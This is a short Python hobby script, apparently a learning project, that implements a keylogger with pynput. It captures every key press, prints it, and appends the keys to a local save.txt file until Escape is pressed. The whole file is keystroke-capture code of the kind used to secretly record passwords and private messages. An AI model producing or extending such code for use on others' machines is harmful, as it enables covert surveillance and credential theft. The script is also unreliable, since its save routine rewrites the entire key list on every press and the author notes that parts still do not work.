#! python3
'''
It logs keys depending on the set count BUT
it doesn't store them to the text file for some reason. Idunno.
'''

import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def press(key): # Left these as Comments because it prints <255> continuously.
    '''
    Code for key presses.
    '''
    global keys, count
    keys.append(key)
    #count += 1
    print(key)
    save(keys)
    #if count >= 10:
    #    count = 0 
    #    save(keys) 

def save(keys):
    '''
    Saves the key presses to a save.txt file.
    '''
    with open(r"C:\Users\Flores\Joey-vscode-workspaces\Python-Projects\completed\keylogger\save.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if key.find("space") > 0:
                file.write("\n")
            elif key.find("key") == -1:
                file.write(key)
            elif key.find('<255>') > 0: # Still doesn't Work.
                file.write("\n")


def release(key):
    '''
    Exits the program if you press Escape.
    '''
    if key == Key.esc:
        return False
    
with Listener(on_press=press, on_release=release) as listener:
    listener.join()